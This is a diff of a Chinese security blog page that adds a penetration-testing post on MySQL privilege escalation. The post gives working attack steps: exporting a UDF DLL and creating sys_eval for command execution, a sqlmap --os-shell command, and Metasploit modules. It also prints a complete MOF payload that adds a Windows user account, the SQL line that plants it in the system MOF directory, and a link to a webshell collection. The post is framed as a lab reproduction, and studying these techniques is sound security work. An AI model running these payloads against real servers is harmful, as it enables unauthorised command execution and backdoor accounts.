@@ -79,16 +79,29 @@
 
 
 
-<meta name="description" content="欢迎来到Shu1L的神秘小屋！">
+<meta name="description" content="提权总结之各种数据库提权方法总结mysql之UDF提权原理分析：​        UDF(user-defined function)是MySQL的一个拓展接口，也可称之为用户自定义函数，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方">
 <meta property="og:type" content="article">
 <meta property="og:title" content="渗透测试中常见提权方式总结(二)">
 <meta property="og:url" content="https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="欢迎来到Shu1L的神秘小屋！">
+<meta property="og:description" content="提权总结之各种数据库提权方法总结mysql之UDF提权原理分析：​        UDF(user-defined function)是MySQL的一个拓展接口，也可称之为用户自定义函数，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方">
+<meta property="og:image" content="d:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428160603.png">
+<meta property="og:image" content="d:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428160926.png">
+<meta property="og:image" content="d:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428163445.png">
+<meta property="og:image" content="d:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428161455.png">
+<meta property="og:image" content="d:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428165018.png">
+<meta property="og:image" content="d:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428174431.png">
+<meta property="og:image" content="d:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428170837.png">
+<meta property="og:image" content="d:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428170940.png">
+<meta property="og:image" content="d:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428185617.png">
+<meta property="og:image" content="d:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428190009.png">
+<meta property="og:image" content="d:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428190809.png">
+<meta property="og:image" content="d:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428184713.png">
 <meta property="article:published_time" content="2020-04-28T01:56:41.000Z">
-<meta property="article:modified_time" content="2020-04-28T03:44:27.508Z">
+<meta property="article:modified_time" content="2020-04-28T11:29:11.023Z">
 <meta property="article:author" content="Shu1L">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="d:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428160603.png">
 
 
 
@@ -328,7 +341,112 @@
       
 
       
-        
+        <h4 id=""><a href="#" class="headerlink" title=""></a></h4><h2 id="提权总结之各种数据库提权方法总结"><a href="#提权总结之各种数据库提权方法总结" class="headerlink" title="提权总结之各种数据库提权方法总结"></a>提权总结之各种数据库提权方法总结</h2><h3 id="mysql之UDF提权"><a href="#mysql之UDF提权" class="headerlink" title="mysql之UDF提权"></a>mysql之UDF提权</h3><h4 id="原理分析："><a href="#原理分析：" class="headerlink" title="原理分析："></a>原理分析：</h4><p>​        <strong>UDF</strong>(user-defined function)是MySQL的一个拓展接口，也可称之为<strong>用户自定义函数</strong>，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。</p>
+<p>​    <strong>动态链接库</strong>：是把程序代码中会使用的函数编译成机器码，不过是保存在.dll文件中。另外在编译时，不会把函数的机器码复制一份到可执行文件中。编译器只会在.exe的执行文件里，说明所要调用的函数放在哪一个*.dll文件。程序执行使用到这些函数时，操作系统会把dll文件中的函数拿出来给执行文件使用</p>
+<p>​    <strong>udf是Mysql类提权的方式之一</strong>。前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权。</p>
+<h4 id="提权常见手法："><a href="#提权常见手法：" class="headerlink" title="提权常见手法："></a>提权常见手法：</h4><p>一般来说使用udf提权的常规手法：</p>
+<ul>
+<li><p>上传大马webshell，利用大马中的UDF提权功能完成提权。</p>
+</li>
+<li><p>反弹shell，进而获取交互式tty shell，在shell中连接本地数据库，从而完成UDF提权。</p>
+</li>
+<li><p>利用FuckMySQL，本地执行命令。<a href="https://github.com/v5est0r/Python_FuckMySQL" target="_blank" rel="noopener">FuckMySQL</a>项目针对Windows平台。</p>
+</li>
+<li><p>利用SQLMAP中的-d参数连接远程数据库，自动上传so库完成UDF提权，从而获取os-shell</p>
+</li>
+<li><p>使用Navicat等数据库管理工具连接远程数据库，从而完成UDF提权。</p>
+</li>
+</ul>
+<p>  其实这些手法的主要目的都是<strong>想方设法登陆数据库服务来执行SQL语句，进而获取到启动MySQL服务的root权限，</strong></p>
+<h4 id="提权的一些前提："><a href="#提权的一些前提：" class="headerlink" title="提权的一些前提："></a>提权的一些前提：</h4><p>利用udf提权有一些利用的先决条件：</p>
+<ul>
+<li>MySQL 数据库没有开启安全模式。</li>
+<li>已知的数据库账号具有对 MySQL 数据库 insert 和 delete 的权限，最好是 root 最高权限。</li>
+<li>shell 有写入到数据库安装目录的权限。</li>
+</ul>
+<p><strong>高版本mysql(mysql Version&gt;5.7)遇到的一些问题：</strong></p>
+<ul>
+<li><p>secure-file-priv默认不为空，即不允许在任意文件夹中导出文件；</p>
+<ul>
+<li>如果对方开启了安全模式，我们是无法利用这个办法进行提权的，所以，为了完成今天的浮现，我们需要关闭安全模式。</li>
+</ul>
+<pre><code>secure_file_priv=&quot;&quot;</code></pre><pre><code> 将这个代码插入到 mysql 配置文件的最后，重启服务，便可以关闭安全模式。</code></pre></li>
+<li><p>默认root用户使用的authentication-plugins为auth_socket，即在本地登录MySQL时使用unix套接字登录，而非密码；</p>
+</li>
+<li><p>mysql.user下password列更改为authentication_string列。</p>
+</li>
+</ul>
+<h4 id="提权复现"><a href="#提权复现" class="headerlink" title="提权复现"></a>提权复现</h4><p>首先通过各种手段获取一个网站的webshell，使用菜刀连接。</p>
+<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428160603.png" alt=""></p>
+<p>这个时候获取到的权限往往是一个低用户权限，我们尝试使用udf数据库提权</p>
+<p>我们这里上传一个暗月的mysql数据库提权大马，命名为<code>dama.php</code></p>
+<p><a href="https://github.com/tennc/webshell这个里面包含了很多webshell，里面还有几种mysql数据库提权马，也可以试试（建议下到虚拟机里！！！！！）" target="_blank" rel="noopener">https://github.com/tennc/webshell这个里面包含了很多webshell，里面还有几种mysql数据库提权马，也可以试试（建议下到虚拟机里！！！！！）</a></p>
+<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428160926.png" alt=""></p>
+<p>直接网页访问，提示我们需要数据库密码，这里我们可以到网站下数据库配置文件找下<code>config.php</code></p>
+<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428163445.png" alt=""></p>
+<p>登录后，发现这里直接给出了一些数据库版本为：5.5.53</p>
+<p>还可以执行数据库命令：</p>
+<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428161455.png" alt=""></p>
+<p>这里补充一个点:</p>
+<ul>
+<li>如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下</li>
+<li>如果mysql版本小于5.1，udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录</li>
+</ul>
+<p>但是mysql默认状态下没有这个文件夹，需要我们自行创建。</p>
+<p>我直接在菜刀下创建plugin文件夹</p>
+<p>然后最关键的一步：<strong>导出UDF文件</strong></p>
+<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428165018.png" alt=""></p>
+<p>导出后，再次尝试文件已经存在，说明导入成功。</p>
+<p>现在只是把udf的动态链接库导出到指定文件夹，还不能使用里面的自定义函数。要想使用自定义函数，就要把udf.dll中的自定义函数引入。</p>
+<p>引入sys_eval函数：</p>
+<pre><code>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;moonudf.dll&#39;</code></pre><p>其中，sys_eval函数是执行任意命令，并将输出返回函数的名字，moonudf.dll是你导出文件的名字;</p>
+<p>之后使用命令模板即可执行命令：</p>
+<pre><code>select sys_eval(&#39;ipconfig)</code></pre><p>也可以直接使用大马这里的功能选项：</p>
+<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428174431.png" alt=""></p>
+<h4 id="其他udf提权方法："><a href="#其他udf提权方法：" class="headerlink" title="其他udf提权方法："></a>其他udf提权方法：</h4><h5 id="msf-udp模块"><a href="#msf-udp模块" class="headerlink" title="msf udp模块"></a>msf udp模块</h5><p>我们使用命令<code>search udf</code>即可看到udf提权payload</p>
+<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428170837.png" alt=""></p>
+<p>进入模块，看一下需要配置选项：</p>
+<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428170940.png" alt=""></p>
+<p>注：这里注意版本，适用于5.5.9以下，</p>
+<h5 id="sqlmap命令"><a href="#sqlmap命令" class="headerlink" title="sqlmap命令"></a>sqlmap命令</h5><p>使用SQLMAP的-d命令来连接服务并执行UDF提权语句；</p>
+<pre><code>sqlmap -d mysql://root:xxxxxx@VPS:3306/mysql --os-shell</code></pre><h3 id="mysql数据库提权之MOF提权"><a href="#mysql数据库提权之MOF提权" class="headerlink" title="mysql数据库提权之MOF提权"></a>mysql数据库提权之MOF提权</h3><h4 id="原理分析：-1"><a href="#原理分析：-1" class="headerlink" title="原理分析："></a>原理分析：</h4><p>利用了<code>c:/windows/system32/wbem/mof/</code>目录下的 <code>nullevt.mof</code> 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。</p>
+<h4 id="提取复现："><a href="#提取复现：" class="headerlink" title="提取复现："></a>提取复现：</h4><p>首先需要具备Mysql的<code>root</code>权限，我们还是使用上面菜刀连接获得的webshell</p>
+<p>然后我们将<code>nullevt.mof</code>导入到一下可写目录</p>
+<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428185617.png" alt=""></p>
+<p>文件内容：</p>
+<pre><code>#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)
+instance of __EventFilter as $EventFilter
+{
+EventNamespace = &quot;Root\\Cimv2&quot;;
+Name = &quot;filtP2&quot;;
+Query = &quot;Select * From __InstanceModificationEvent &quot;
+&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;
+&quot;And TargetInstance.Second = 5&quot;;
+QueryLanguage = &quot;WQL&quot;;
+};
+instance of ActiveScriptEventConsumer as $Consumer
+{
+Name = &quot;consPCSV2&quot;;
+ScriptingEngine = &quot;JScript&quot;;
+ScriptText =
+&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user test test /add\&quot;)&quot;;
+};
+instance of __FilterToConsumerBinding
+{
+Consumer = $Consumer;
+Filter = $EventFilter;
+};</code></pre><p>这里<code>net user test test /add</code>可以自定义，我们这里就是添加一个test用户。</p>
+<p>之后我们使用sql语句将文件导入到<code>c:/windows/system32/wbem/mof/</code>下</p>
+<pre><code>select load_file(&quot;C:/phpStudy/WWW/nullevt.mof&quot;) into dumpfile &quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;</code></pre><p>可以使用菜刀下的数据库管理工具执行</p>
+<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428190009.png" alt=""></p>
+<p>执行后，到win2003上查看用户：</p>
+<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428190809.png" alt=""></p>
+<h4 id="其他mof提权方法："><a href="#其他mof提权方法：" class="headerlink" title="其他mof提权方法："></a>其他mof提权方法：</h4><h5 id="msf-mof提权"><a href="#msf-mof提权" class="headerlink" title="msf mof提权"></a>msf mof提权</h5><p>使用<code>mysql_mof</code>模块，有的版本不能成功，</p>
+<h5 id="上传mof-php"><a href="#上传mof-php" class="headerlink" title="上传mof.php"></a>上传mof.php</h5><p>直接上传mof.php执行命令</p>
+<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428184713.png" alt=""></p>
+<p>我试了几次都失败了，这里应该需要开启mysql远程连接的功能。。。。</p>
+<h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://xz.aliyun.com/t/7392#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/7392#toc-10</a></p>
+
       
     </div>
     
@@ -416,8 +534,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -436,7 +563,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-count">41</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -458,7 +585,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-count">29</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -481,6 +608,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">1.</span> <span class="nav-text"></span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#提权总结之各种数据库提权方法总结"><span class="nav-number"></span> <span class="nav-text">提权总结之各种数据库提权方法总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql之UDF提权"><span class="nav-number"></span> <span class="nav-text">mysql之UDF提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#原理分析："><span class="nav-number">1.</span> <span class="nav-text">原理分析：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#提权常见手法："><span class="nav-number">2.</span> <span class="nav-text">提权常见手法：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#提权的一些前提："><span class="nav-number">3.</span> <span class="nav-text">提权的一些前提：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#提权复现"><span class="nav-number">4.</span> <span class="nav-text">提权复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#其他udf提权方法："><span class="nav-number">5.</span> <span class="nav-text">其他udf提权方法：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#msf-udp模块"><span class="nav-number">5.1.</span> <span class="nav-text">msf udp模块</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sqlmap命令"><span class="nav-number">5.2.</span> <span class="nav-text">sqlmap命令</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql数据库提权之MOF提权"><span class="nav-number"></span> <span class="nav-text">mysql数据库提权之MOF提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#原理分析：-1"><span class="nav-number">1.</span> <span class="nav-text">原理分析：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#提取复现："><span class="nav-number">2.</span> <span class="nav-text">提取复现：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#其他mof提权方法："><span class="nav-number">3.</span> <span class="nav-text">其他mof提权方法：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#msf-mof提权"><span class="nav-number">3.1.</span> <span class="nav-text">msf mof提权</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#上传mof-php"><span class="nav-number">3.2.</span> <span class="nav-text">上传mof.php</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考文章"><span class="nav-number">3.3.</span> <span class="nav-text">参考文章</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
